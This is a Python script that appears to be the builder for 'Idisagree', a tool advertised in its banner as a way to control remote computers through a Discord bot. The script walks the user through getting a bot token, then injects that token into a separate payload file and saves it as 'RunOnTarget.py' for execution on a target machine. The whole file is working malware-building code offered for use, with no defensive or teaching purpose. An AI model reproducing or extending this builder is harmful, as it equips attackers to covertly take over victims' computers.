
import sys
import platform
if platform.system() == "Windows" and "-c" not in sys.argv:
    RED, CYAN, GREEN, END = '', '', '', ''
else:
    RED, CYAN, GREEN, END = '\033[91m', '\033[36m', '\033[1;32m', '\033[0m'


def ascii():
    print('''
{2}  (\____/)-{1}             UndeadSec | Znunu
{2}   (_oo_)       ██{0}      ██ ██ ██████ ██████ ██████      ██████ ██████{1}
{2}     (O)        ██{0}      ██    ██         ██ ██     ██   ██  ██ ██  ██{1}
{2}   __||__    \) ██{0}  ██████ ██ ██████ ██████ ██ ███ ████ ██████ ██████{1}
{2}[]/______\[] /  ██{0}  ██  ██ ██     ██ ██  ██ ██  ██ ██   ██     ██{1}
{2}/ \______/ \/   ██{0}  ██████ ██ ██████ ██████ ██████ ██   ██████ ██████{1}
{2}    /__\              CONTROL REMOTE COMPUTERS USING DISCORD BOT{1} v1.1

{3}[{1}?{3}]{1} IT'S YOUR FIRST TIME HERE?
{3}:{1} FOLLOW THESE STEPS:

{3}>{1} CREATE AN ACCOUNT AT DISCORD AND GET YOUR DISCORD ID. EXAMPLE: TEST#0000
({2}https://discordapp.com/{1})
{3}>{1} CREATE A DISCORD SERVER 
({2}https://discordapp.com/{1})
{3}>{1} CREATE AN DISCORD APP AND MAKE YOUR APP INTO A BOT 
({2}https://discordapp.com/developers/applications/me#top{1})
{3}>{1} GET THE BOT TOKEN 
({2}https://discordapp.com/developers/applications/me#top{1})
{3}>{1} ADD BOT TO YOUR DISCORD SERVER
({2}Complete tutorial: https://github.com/UndeadSec/Idisagree{1})'''.format(RED, END, CYAN, GREEN))


def end():
    pass


def generate(botToken):
    info = 'botToken = ' + '\'' + botToken + '\''
    with open('payload.py', 'r') as contents:
        save = contents.read()
    with open('RunOnTarget.py','w') as contents:
        contents.write(info)
    with open('RunOnTarget.py','a') as contents:
        contents.write(save)
    return('{0}[{1}*{0}]{1} Saved as {2}RunOnTarget.py{1}\nRun the file to activate [{3}I{2}disagree{1}]'.format(GREEN, END, RED, CYAN))


def config():   
    botToken = input('\n[{0}I{1}disagree{2}] BOT TOKEN: '.format(CYAN, RED, END))
    print('\n[~] Configuration:\n [BOT TOKEN] = ' + botToken)
    confirm = input('\nConfirm ? (y/n) : ')
    if confirm.upper() == 'Y':
        print(generate(botToken))
    else:
        config()


def main():
    ascii()
    config()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        end()
        exit(0)
